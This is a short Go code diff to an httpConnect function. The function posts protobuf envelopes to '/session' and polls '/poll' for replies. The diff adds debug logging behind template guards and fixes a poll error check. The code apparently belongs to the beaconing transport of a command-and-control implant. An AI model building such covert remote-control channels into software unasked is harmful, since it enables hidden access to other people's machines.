@@ -246,6 +246,9 @@ func httpConnect() (*Connection, error) {
 		defer connection.Cleanup()
 		for envelope := range send {
 			data, _ := proto.Marshal(envelope)
+			// {{if .Debug}}
+			log.Printf("[http] send envelope ...")
+			// {{end}}
 			go client.Post("/session", data)
 		}
 	}()
@@ -258,12 +261,18 @@ func httpConnect() (*Connection, error) {
 				return
 			default:
 				resp, err := client.Get("/poll")
-				if err != nil && resp != nil {
+				// {{if .Debug}}
+				log.Printf("Poll result: %v (err: %v)", resp, err)
+				// {{end}}
+				if err == nil {
 					envelope := &pb.Envelope{}
 					proto.Unmarshal(resp, envelope)
 					if err != nil {
 						continue
 					}
+					// {{if .Debug}}
+					log.Printf("[http] recv envelope ...")
+					// {{end}}
 					recv <- envelope
 				}
 			}
